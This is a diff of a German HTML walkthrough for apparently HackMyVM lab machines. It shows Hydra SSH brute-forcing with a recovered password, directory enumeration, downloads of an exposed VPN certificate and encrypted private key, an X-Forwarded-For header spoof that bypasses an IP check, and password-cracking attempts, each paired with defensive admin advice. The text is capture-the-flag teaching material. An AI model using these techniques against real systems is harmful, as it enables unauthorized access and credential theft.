-[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344416 login tries (l:1/p:14344416), ~896526 tries per task<br>
-[DATA] attacking ssh://panda.hmv:22/<br>
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
-[22][ssh] host: panda.hmv   login: po   password: !ts-bl4nk<br>
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
-1 of 1 target successfully completed, 1 valid password found
-                </div>
-            </div>
-            <p class="comment">
-                Hydra hat das Passwort "!ts-bl4nk" für den Benutzer "po" gefunden.
+                <strong>Empfehlung (Admin):</strong>
+                Protokollierung und Überwachung von Webserver-Zugriffen können helfen, Brute-Force-Versuche wie die von <code>feroxbuster</code> zu erkennen. Rate-Limiting oder Tools wie <code>fail2ban</code> können solche automatisierten Angriffe erschweren.
             </p>
 
+            <p class="analysis"><strong>Analyse:</strong>
+                Wir verwenden nun <code>dirb</code>, ein weiteres Werkzeug zum Brute-Forcen von Verzeichnissen und Dateien, um gezielt das Verzeichnis <code>/service/</code> auf dem Webserver <code>http://192.168.2.191/</code> zu untersuchen.
+                Der Befehl <code>dirb http://192.168.2.191/service /usr/share/seclists/Discovery/Web-Content/big.txt -R -X .php,.txt,.jpg,.crt</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>http://192.168.2.191/service/</code>: Die Basis-URL für den Scan.</li>
+                    <li><code>/usr/share/seclists/Discovery/Web-Content/big.txt</code>: Die Wortliste, die für das Brute-Forcing verwendet wird.</li>
+                    <li><code>-R</code>: Aktiviert die interaktive Rekursion (obwohl dies in der Ausgabe nicht direkt ersichtlich ist, wie sie genutzt wird). Üblicherweise bedeutet Rekursion, dass gefundene Verzeichnisse ebenfalls gescannt werden.</li>
+                    <li><code>-X .php,.txt,.jpg,.crt</code>: Fügt diese spezifischen Dateiendungen zu den zu suchenden Namen hinzu. Dies ist sehr wichtig, da wir nach OpenVPN-Zertifikatsdateien (<code>.crt</code>) und möglicherweise Konfigurations- oder Informationsdateien (<code>.txt</code>, <code>.php</code>) suchen.</li>
+                </ul>
+            </p>
             <div class="code-block">
                 <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">ssh po@panda.hmv</span>
-                    </div>
-                </div>
-                <div class="terminal">
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
-po@panda.hmv's password: <span class="password">!ts-bl4nk</span><br>
-::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br>
-Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64<br><br>
-The programs included with the Debian GNU/Linux system are free software;<br>
-the exact distribution terms for each program are described in the<br>
-individual files in /usr/share/doc/*/copyright.<br><br>
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>
-permitted by applicable law.<br>
-po@hostname:~$
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">dirb http://192.168.2.191/service /usr/share/seclists/Discovery/Web-Content/big.txt -R -X .php,.txt,.jpg,.crt</span></div>
+                    <pre>
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: <span class="command">Thu May 15 00:21:57 2025</span>
+URL_BASE: <span class="command">http://192.168.2.191/service/</span>
+WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/big.txt
+OPTION: Interactive Recursion
+EXTENSIONS_LIST: <span class="command">(.php,.txt,.jpg,.crt)</span> | (.php)(.txt)(.jpg)(.crt) [NUM = 4]
+
+-----------------
+
+GENERATED WORDS: 20467                                                         
+
+---- Scanning URL: http://192.168.2.191/service/ ----
+<span class="password">+ http://192.168.2.191/service/ca.crt (CODE:200|SIZE:1200)</span>
+<span class="password">+ http://192.168.2.191/service/client.crt (CODE:200|SIZE:4492)</span>
+<span class="command">+ http://192.168.2.191/service/index.php (CODE:200|SIZE:59)</span>
+<span class="password">+ http://192.168.2.191/service/vpn.txt (CODE:403|SIZE:276)</span>
+                                                                                             
+-----------------
+END_TIME: <span class="command">Thu May 15 00:22:28 2025</span>
+DOWNLOADED: 81868 - FOUND: 4
+</pre>
                 </div>
             </div>
-            <p class="comment">
-                Wir haben uns erfolgreich per SSH als Benutzer "po" angemeldet.
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Dieser <code>dirb</code>-Scan ist ein Volltreffer! Er deckt genau die Dateien auf, die wir für die OpenVPN-Verbindung benötigen:
+                <ul>
+                    <li><code>ca.crt</code> (CODE:200): Das Zertifikat der Zertifizierungsstelle (Certificate Authority). Dies wird benötigt, um die Authentizität des VPN-Servers zu überprüfen.</li>
+                    <li><code>client.crt</code> (CODE:200): Das öffentliche Zertifikat des Clients.</li>
+                    <li><code>index.php</code> (CODE:200): Die bereits bekannte OpenVPN-Konfigurationsvorlage.</li>
+                    <li><code>vpn.txt</code> (CODE:403): Eine Textdatei namens <code>vpn.txt</code> wurde gefunden, aber der Zugriff darauf ist verboten (Statuscode 403 - Forbidden). Dies könnte interessante Informationen enthalten, aber wir können sie derzeit nicht abrufen. Es ist möglich, dass die IP-Spoofing-Technik auch hier angewendet werden muss oder andere Zugriffsbeschränkungen greifen.</li>
+                </ul>
+                Das Wichtigste ist, dass wir nun die Pfade zum CA-Zertifikat und zum Client-Zertifikat haben. Was noch fehlt, ist der private Schlüssel des Clients (wahrscheinlich <code>client.key</code>).
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die Dateien <code>ca.crt</code> und <code>client.crt</code> müssen sofort heruntergeladen werden. Anschließend muss versucht werden, auch den privaten Schlüssel (wahrscheinlich <code>client.key</code>) im Verzeichnis <code>/service/</code> zu finden. Ein weiterer <code>dirb</code>-Scan oder ein manueller Versuch mit <code>curl</code> auf <code>http://192.168.2.191/service/client.key</code> (unter Verwendung des IP-Spoofing-Tricks, falls nötig) ist der nächste logische Schritt. Der Inhalt von <code>vpn.txt</code> bleibt ein interessantes Ziel, falls der Zugriff später ermöglicht werden kann.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Niemals sollten Zertifikatsdateien, insbesondere private Schlüssel, öffentlich über einen Webserver zugänglich sein. Dies ist eine gravierende Sicherheitslücke. Solche Dateien müssen außerhalb des Web-Roots gespeichert und mit strengen Dateiberechtigungen versehen werden. Der 403-Fehler für <code>vpn.txt</code> ist zwar besser als ein direkter Zugriff, aber die Existenz der Datei ist bereits bekannt. Sensible Informationen sollten nicht einmal als Dateinamen im Web-Root auftauchen.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Basierend auf den Ergebnissen des vorherigen <code>dirb</code>-Scans laden wir nun die gefundenen Zertifikatsdateien <code>ca.crt</code> und <code>client.crt</code> herunter. Wir verwenden <code>curl</code> mit der Option <code>-o [Dateiname]</code>, um die heruntergeladene Datei direkt unter dem angegebenen Namen zu speichern, und <code>-s</code> für den stillen Modus (keine Fortschrittsanzeige).
+                Anschließend wird mit <code>ll *.crt</code> der Inhalt des aktuellen Verzeichnisses aufgelistet, gefiltert nach Dateien, die auf <code>.crt</code> enden, um zu überprüfen, ob die Dateien erfolgreich heruntergeladen wurden und welche Größe sie haben.
+                Danach wird versucht, eine Datei namens <code>.htaccess</code> aus dem Verzeichnis <code>/service/</code> herunterzuladen und deren Inhalt anzuzeigen. <code>.htaccess</code>-Dateien werden vom Apache-Webserver verwendet, um Konfigurationseinstellungen auf Verzeichnisebene zu definieren, einschließlich Zugriffskontrollen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -o ca.crt http://homelab.hmv/service/ca.crt -s</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -o client.crt http://homelab.hmv/service/client.crt -s</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ll *.crt</span></div>
+                    <pre>
+<span class="command">-rw-r--r-- 1 root root 1200 15. Mai 00:23 ca.crt</span>
+<span class="command">-rw-r--r-- 1 root root 4492 15. Mai 00:23 client.crt</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -o htaccess.txt http://homelab.hmv/service/.htaccess -s</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ll *acce*</span></div>
+                    <pre><span class="command">-rw-r--r-- 1 root root 274 15. Mai 00:25 htaccess.txt</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat htaccess.txt</span></div>
+                    <pre> 
+ <span class="password">403 Forbidden</span> 
+ 
+ 
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+ Apache/2.4.62 (Unix) Server at homelab.hmv Port 80 
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Zertifikate <code>ca.crt</code> (1200 Bytes) und <code>client.crt</code> (4492 Bytes) wurden erfolgreich heruntergeladen. Dies sind wichtige Komponenten für die OpenVPN-Verbindung.
+                Der Versuch, <code>.htaccess</code> herunterzuladen, war ebenfalls "erfolgreich" in dem Sinne, dass eine Datei heruntergeladen wurde. Allerdings enthält <code>htaccess.txt</code> nicht den Inhalt einer <code>.htaccess</code>-Datei, sondern die HTML-Fehlerseite für einen "403 Forbidden"-Fehler. Das bedeutet, dass der direkte Zugriff auf <code>.htaccess</code>-Dateien vom Server blockiert wird, was eine übliche und gute Sicherheitspraxis ist. Es ist unwahrscheinlich, dass wir hier auf diesem Weg an den Inhalt der <code>.htaccess</code>-Datei gelangen, falls eine existiert und aktiv ist. Der <code>dirb</code>-Scan hat sie auch nicht direkt mit Status 200 gefunden.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der Fokus liegt weiterhin darauf, den privaten Schlüssel <code>client.key</code> zu finden und herunterzuladen. Da der Zugriff auf <code>.htaccess</code> gesperrt ist, ist dies kein direkter Angriffsvektor mehr. Die IP-Spoofing-Technik könnte auch für den Zugriff auf <code>client.key</code> notwendig sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Das Blockieren des direkten Zugriffs auf <code>.htaccess</code>-Dateien ist korrekt konfiguriert. Es sollte sichergestellt werden, dass auch andere sensible Konfigurationsdateien (wie <code>.htpasswd</code>, etc.) nicht direkt über das Web zugänglich sind. Die heruntergeladenen Zertifikate (CA und Client-Zertifikat) sind öffentlich, aber der private Schlüssel darf unter keinen Umständen öffentlich zugänglich sein.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Wir versuchen nun, die entscheidende Datei, den privaten Schlüssel des Clients (<code>client.key</code>), aus dem Verzeichnis <code>/service/</code> herunterzuladen. Da wir bereits erfolgreich Zertifikate von dort beziehen konnten, ist die Wahrscheinlichkeit hoch, dass auch der Schlüssel dort liegt.
+                Der Befehl <code>curl -o client.key http://homelab.hmv/service/client.key -s</code> wird verwendet, um die Datei herunterzuladen und als <code>client.key</code> zu speichern.
+                Anschließend wird der Inhalt der heruntergeladenen Datei mit <code>cat client.key</code> angezeigt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -o client.key http://homelab.hmv/service/client.key -s</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat client.key</span></div>
+                    <pre>
+<span class="command">-----BEGIN ENCRYPTED PRIVATE KEY-----</span>
+<span class="command">MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A</span>
+<span class="command">xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI</span>
+<span class="command">o2XhzDmt4VwIs9a2+TlCU8B9wfv4CKyoX6kqbmbEjwnUtIjV6ouTAdp423q8aEMP</span>
+<span class="command">9vIPo/QUvnAAcxflWs0JAg9cDN9Mix1TygNaqtiOnfodE/powg2+HJH58byf3C2/</span>
+<span class="command">L9i/Eyhy4PUFBocAQEMcL+OOlhV6N/K+YI26UpM3cb1W/bZa/D1kitPTc3aNaEcm</span>
+<span class="command">cik0vozX4LaCAkWUkrfQTDmWy30nvSGlByAOrdKTdc73ZKYjhfJ0aBAvnr3l9YJ1</span>
+<span class="command">6P5GZ4plb0rsATaxKJX2qlza9CeAVtEBYxJXtLsv82ydLhdV9QIfL971GRwT7ufJ</span>
+<span class="command">O04GlQnnD1+RXsgX/HX8TlqtWB+cNHPXU5goKoV98vMU9LhOLkgBt+F8VBXngXSa</span>
+<span class="command">x/6vVA2JTq14GAuVptRRvk3NWspXbWPcEfeIRjagP1+d2eIZB6Jf3KNqFzlEZJBg</span>
+<span class="command">9sVFw8K4Kl1y46A767/6zAgR1yWxZUIu4DqqxrD/J+jefqEzHEpWs/hKkqDFOiY+</span>
+<span class="command">rtTiaG1DwVMw+EUCOOkWlzgC+J+z4ne26NxlRrDEIg85X5UfDnbDzQcvTOq8QZHF</span>
+<span class="command">QH0OMFtKVT3EnKyChVSKDSjSBoMV6DjWB1BGI9SIaca5yKjtYJm9ZKgc319XnuDH</span>
+<span class="command">LCHIQfERyaTypf87MAahh0P43ZUn4FJoH7DVa4R4lluyJnwr3fXcPdN+lmVAlH/b</span>
+<span class="command">fLsGy3NNjBjNqUgkr923SOoTQXtz8HN1TSM/P11w6udvjOcHtBTV+eRczkBStvPV</span>
+<span class="command">W0OqZMPGDaEg+HGsdQt3moGxRwgP7HEHp7IRR1mvHHjtg4UgflDtfa5BfxEOlWyF</span>
+<span class="command">p/aV4JTVWsBhV6jEEhtY2+5vvhRammSvW6+HWqpicEE0Kekm5lf9hh3jNvXPbeuP</span>
+<span class="command">gV000gW7ZfHRmIbfGn1/RQtizqxBDrzjPsXIvrnsR5kdqWuDYdI3681QErb7txoX</span>
+<span class="command">+7urFS1MErtwmMIxsjkKgZyxzn71CHrSRwxlPSJMOe4LWprVk92By533yuccJXNx</span>
+<span class="command">Lk63VtvH/H+EPeFisTnX2rN7Y4Yz/k+wbJH7cyS5PMu0I49scZPqWnZwEd+6SyKq</span>
+<span class="command">3AkTXtytghizriWnxlq4dzaAUjDGCnR9vqy8cNgpJRwQTczorCqRf+3vf8oji0b+</span>
+<span class="command">IeyTNyJeS+S8YEoFSxCHVdSy1YS7EnXWAF7fV49Rpwz8kzdi+dGVXyF9oxp+XAM5</span>
+<span class="command">827TdKT0NueVxakHRqm6Px23xQHvfPn2lYbzX1C1piLRFAXOk+5l7VflLoCl5QnN</span>
+<span class="command">UjzWysu0morMJ8d4nrhaCzcUQc55lJJoX5VU3tRrAjQ1yDhmKKQ0Ga3iGiA3CGop</span>
+<span class="command">BNj4qIST98Z/fcVT79ZP0kykcD91KNOQsJz7Zc6gJvat2EbCZksj584981bySrgA</span>
+<span class="command">vWJ/0ikaF2+PrVHrKMi6cn75Eiz2fO2xovr8q8sh0n3iegHvAmXRhU2zb2DEjTWk</span>
+<span class="command">X+UgNh/LzoYJEkFE+atB7QnPy5TB+HQF/UW22ZAygXkzVdk8Wl36hlsDNtz+wvOd</span>
+<span class="command">uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD</span>
+<span class="command">Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue</span>
+<span class="command">-----END ENCRYPTED PRIVATE KEY-----</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Fantastisch! Der private Schlüssel <code>client.key</code> wurde erfolgreich heruntergeladen. Die Ausgabe zeigt einen PEM-formatierten privaten Schlüssel, der mit <code>-----BEGIN ENCRYPTED PRIVATE KEY-----</code> beginnt. Dies bestätigt, dass der Schlüssel verschlüsselt ist, wie bereits in der OpenVPN-Konfigurationsvorlage angedeutet wurde ("Regenerate a STRONG password for the KEY").
+                Wir haben jetzt alle drei notwendigen Komponenten für eine OpenVPN-Verbindung:
+                <ol>
+                    <li><code>ca.crt</code> (CA-Zertifikat)</li>
+                    <li><code>client.crt</code> (Client-Zertifikat)</li>
+                    <li><code>client.key</code> (verschlüsselter privater Schlüssel des Clients)</li>
+                </ol>
+                Die nächste Herausforderung besteht darin, die Passphrase für den <code>client.key</code> zu knacken.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die Passphrase des verschlüsselten privaten Schlüssels <code>client.key</code> muss nun mit Tools wie <code>openssl</code> (um das Format zu prüfen und den Entschlüsselungsversuch zu starten) und Passwort-Crackern wie <code>John the Ripper</code> (oft über <code>pem2john</code> zum Extrahieren des Hashes) oder einem benutzerdefinierten Brute-Force-Skript angegangen werden. Die Warnung in der <code>.ovpn</code>-Datei bezüglich der Wiederverwendung von Passwörtern legt nahe, dass das Passwort möglicherweise nicht extrem komplex ist oder mit dem Benutzernamen "shinosawa" in Verbindung steht.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Wie bereits mehrfach betont: Private Schlüssel dürfen niemals über einen Webserver zugänglich sein. Dies ist eine kritische Sicherheitslücke. Wenn Schlüssel passwortgeschützt sind, müssen die Passphrasen stark und einzigartig sein und dürfen nicht leicht zu erraten oder mit anderen Diensten identisch sein. Die Richtlinien zur Passwortkomplexität und -einzigartigkeit müssen durchgesetzt werden.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Wir versuchen nun, Informationen über den heruntergeladenen, verschlüsselten privaten Schlüssel <code>client.key</code> mit <code>openssl</code> zu erhalten und ihn zu entschlüsseln.
+                Der Befehl <code>openssl pkey -in client.key -text -noout</code> wird verwendet:
+                <ul>
+                    <li><code>pkey</code>: Ein <code>openssl</code>-Befehl zur Verwaltung von öffentlichen und privaten Schlüsseln.</li>
+                    <li><code>-in client.key</code>: Gibt die Eingabedatei an.</li>
+                    <li><code>-text</code>: Versucht, den Schlüsselinhalt in Textform auszugeben.</li>
+                    <li><code>-noout</code>: Unterdrückt die Ausgabe des verschlüsselten Schlüssels selbst.</li>
+                </ul>
+                <code>openssl</code> wird nach einer Passphrase fragen, um den Schlüssel zu entschlüsseln. Wir geben hier testweise keine Passphrase ein (leere Eingabe), um das Verhalten zu beobachten.
+                Anschließend wird versucht, den Hash des Schlüssels für das Passwort-Cracking-Tool <code>John the Ripper</code> zu extrahieren.
+                <ul>
+                    <li><code>pem2john client.key > client.key.john_hash</code>: Das Skript <code>pem2john</code> (Teil von John the Ripper) konvertiert den PEM-formatierten Schlüssel in ein Hash-Format, das John versteht, und speichert es in <code>client.key.john_hash</code>.</li>
+                    <li><code>john --wordlist=/usr/share/wordlists/rockyou.txt client.key.john_hash</code>: Startet John the Ripper mit der bekannten Wortliste <code>rockyou.txt</code>, um zu versuchen, die Passphrase für den extrahierten Hash zu finden.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">openssl pkey -in client.key -text -noout</span></div>
+                    <pre>Enter pass phrase for client.key:</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">openssl pkey -in client.key -text -noout</span></div>
+                    <pre>
+Enter pass phrase for client.key:
+<span class="password">Could not find private key of key from client.key</span>
+<span class="password">409787CF1E7F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:</span>
+<span class="password">409787CF1E7F0000:error:11800074:PKCS12 routines:PKCS12_pbe_crypt_ex:pkcs12 cipherfinal error:../crypto/pkcs12/p12_decr.c:92:empty password</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">pem2john client.key > client.key.john_hash</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt client.key.john_hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+<span class="password">No password hashes loaded (see FAQ)</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der Versuch, den Schlüssel mit <code>openssl</code> und einer leeren Passphrase zu entschlüsseln, schlägt erwartungsgemäß fehl ("bad decrypt", "pkcs12 cipherfinal error:empty password"). Dies bestätigt, dass der Schlüssel tatsächlich passwortgeschützt ist.
+                Der Versuch, den Hash mit <code>pem2john</code> zu extrahieren und dann mit <code>john</code> zu knacken, schlägt ebenfalls fehl ("No password hashes loaded"). Dies kann verschiedene Gründe haben:
+                <ul>
+                    <li>Der Schlüssel verwendet möglicherweise ein Verschlüsselungsformat oder einen Algorithmus, den die verwendete Version von <code>pem2john</code> oder <code>john</code> nicht standardmäßig unterstützt oder für den keine passenden Hash-Typen geladen sind.</li>
+                    <li>Es könnte ein Problem mit der <code>pem2john</code>-Konvertierung selbst geben.</li>
+                    <li>Manchmal benötigen bestimmte Schlüsselformate spezielle Optionen für <code>john</code>.</li>
+                </ul>
+                Da <code>john</code> den Hash nicht laden kann, ist ein direkter Angriff mit <code>rockyou.txt</code> über diesen Weg nicht erfolgreich. Wir müssen eine alternative Methode zum Brute-Forcen der Passphrase finden, wahrscheinlich durch direktes Ausprobieren mit <code>openssl</code>.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Da <code>john</code> den Hash nicht verarbeiten kann, sollte ein benutzerdefiniertes Skript erstellt werden, das systematisch Passwörter aus einer Wortliste (wie <code>rockyou.txt</code>) nimmt und versucht, den <code>client.key</code> mit <code>openssl pkey -in client.key -passin pass:&lt;passwort&gt;</code> zu entschlüsseln. Der Erfolg kann durch Überprüfung des Rückgabecodes von <code>openssl</code> festgestellt werden.
+                Man könnte auch andere Tools oder Formate für <code>john</code> recherchieren, falls der Schlüssel ein ungewöhnliches Format hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Verwendung starker, einzigartiger Passphrasen für verschlüsselte private Schlüssel ist entscheidend. Wenn Standard-Passwort-Cracking-Tools Probleme haben, den Hash zu verarbeiten, kann dies die Zeit bis zur Kompromittierung verlängern, aber es ist kein vollständiger Schutz, wenn die Passphrase selbst schwach ist. Die Überwachung fehlgeschlagener Entschlüsselungsversuche ist in der Regel nicht möglich, da dies clientseitig geschieht. Der Schutz liegt in der Stärke der Passphrase und der Sicherheit des Schlüsselspeichers.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Da der vorherige Versuch, die OpenVPN-Konfigurationsdatei <code>/service/index.php</code> direkt aufzurufen, fehlschlug und wir die IP-Spoofing-Technik mit dem <code>X-Forwarded-For</code>-Header benötigten, wird hier nun der <code>curl</code>-Befehl gezeigt, der diesen Header verwendet, um den Inhalt abzurufen.
+                Der Befehl <code>curl http://192.168.2.191/service/ -H 'X-Forwarded-For:192.168.2.191' -s</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>http://192.168.2.191/service/</code>: Die Ziel-URL. Beachten Sie den abschließenden Schrägstrich, der das Verzeichnis <code>service</code> anstelle einer spezifischen Datei anspricht. Webserver liefern oft eine Standarddatei (wie <code>index.php</code> oder <code>index.html</code>) aus, wenn ein Verzeichnis angefordert wird.</li>
+                    <li><code>-H 'X-Forwarded-For:192.168.2.191'</code>: Fügt den HTTP-Header <code>X-Forwarded-For</code> mit dem Wert der Server-IP selbst hinzu. Dies ist der IP-Spoofing-Trick.</li>
+                    <li><code>-s</code>: Stiller Modus, unterdrückt die Fortschrittsanzeige von <code>curl</code>.</li>
+                </ul>
+                Die Ausgabe ist die bereits bekannte OpenVPN-Konfigurationsvorlage.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.191/service/ -H 'X-Forwarded-For:192.168.2.191' -s</span></div>
+                    <pre>
+<span class="command"># Last modified by shinosawa</span>
+<span class="command"># on 2024-12-21</span>
+
+<span class="command"># Example Configuration File</span>
+
+<span class="command">client</span>
+<span class="command">dev tun</span>
+<span class="command">proto udp</span>
+<span class="command">remote ? ?</span>
+<span class="command">resolv-retry infinite</span>
+<span class="command">nobind</span>
+<span class="command">persist-key</span>
+<span class="command">persist-tun</span>
+<span class="command">ca ?</span>
+<span class="command">cert ?</span>
+<span class="command"># Regenerate a STRONG password for the KEY</span>
+<span class="command"># Do NOT use a SAME password as other services et. SSH</span>
+<span class="command"># it is DANGEROUS!</span>
+<span class="command">key ?</span>
+<span class="command">cipher AES-256-GCM</span>
+<span class="command">verb 3</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Dieser Schritt bestätigt erneut, dass der Zugriff auf die <code>/service/index.php</code> (die Standarddatei im Verzeichnis <code>/service/</code>) nur durch Spoofing der IP-Adresse über den <code>X-Forwarded-For</code>-Header möglich ist. Die angezeigte Konfigurationsdatei ist identisch mit der zuvor gesehenen und liefert keine neuen direkten Informationen, dient aber als Erinnerung an den Mechanismus.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Diese Technik (Verwendung von <code>X-Forwarded-For</code>) sollte im Hinterkopf behalten werden, falls andere Ressourcen auf dem Server ebenfalls zugriffsbeschränkt sind. Der Fokus bleibt auf dem Knacken der Passphrase für den <code>client.key</code>.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Sicherheitslücke bezüglich der unsachgemäßen Validierung des <code>X-Forwarded-For</code>-Headers wurde bereits adressiert. Es muss sichergestellt werden, dass alle Zugriffskontrollen robust sind und sich nicht auf leicht manipulierbare Client-seitige Informationen verlassen.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Da die OpenVPN-Konfiguration <code>proto udp</code> spezifiziert, führen wir einen UDP-Portscan mit <code>nmap</code> durch, um festzustellen, ob der OpenVPN-Dienst auf dem Standard-UDP-Port 1194 oder anderen gängigen UDP-Ports lauscht.
+                Der Befehl <code>sudo nmap -sU --top-ports 20 -sV 192.168.2.191 -Pn</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>sudo</code>: UDP-Scans erfordern oft Root-Rechte, um Raw Sockets erstellen zu können.</li>
+                    <li><code>-sU</code>: Führt einen UDP-Scan durch.</li>
+                    <li><code>--top-ports 20</code>: Scannt nur die 20 häufigsten UDP-Ports, um Zeit zu sparen. Ein vollständiger UDP-Scan aller 65535 Ports kann sehr lange dauern.</li>
+                    <li><code>-sV</code>: Versucht, die Version der auf den offenen Ports laufenden Dienste zu ermitteln.</li>
+                    <li><code>-Pn</code>: Überspringt die Host-Discovery, da wir wissen, dass der Host online ist.</li>
+                </ul>
+                Anschließend wird ein spezifischer UDP-Scan nur für Port 1194 (Standard-OpenVPN-Port) durchgeführt: <code>nmap -sU -p 1194 192.168.2.191</code>.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sudo nmap -sU --top-ports 20 -sV 192.168.2.191 -Pn</span></div>
+                    <pre>
+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-15 00:47 CEST</span>
+Nmap scan report for <span class="command">homelab.hmv (192.168.2.191)</span>
+Host is up (0.00023s latency).
+
+<span class="command">PORT      STATE         SERVICE      VERSION</span>
+<span class="command">53/udp    open|filtered domain</span>
+<span class="command">67/udp    closed        dhcps</span>
+<span class="command">68/udp    closed        dhcpc</span>
+<span class="command">69/udp    open|filtered tftp</span>
+<span class="command">123/udp   closed        ntp</span>
+<span class="command">135/udp   closed        msrpc</span>
+<span class="command">137/udp   closed        netbios-ns</span>
+<span class="command">138/udp   open|filtered netbios-dgm</span>
+<span class="command">139/udp   closed        netbios-ssn</span>
+<span class="command">161/udp   closed        snmp</span>
+<span class="command">162/udp   closed        snmptrap</span>
+<span class="command">445/udp   closed        microsoft-ds</span>
+<span class="command">500/udp   open|filtered isakmp</span>
+<span class="command">514/udp   open|filtered syslog</span>
+<span class="command">520/udp   closed        route</span>
+<span class="command">631/udp   closed        ipp</span>
+<span class="command">1434/udp  open|filtered ms-sql-m</span>
+<span class="command">1900/udp  open|filtered upnp</span>
+<span class="command">4500/udp  open|filtered nat-t-ike</span>
+<span class="command">49152/udp closed        unknown</span>
+MAC Address: <span class="command">08:00:27:58:13:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/].
+Nmap done: 1 IP address (1 host up) scanned in 76.47 seconds
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sU -p 1194 192.168.2.191</span></div>
+                    <pre>
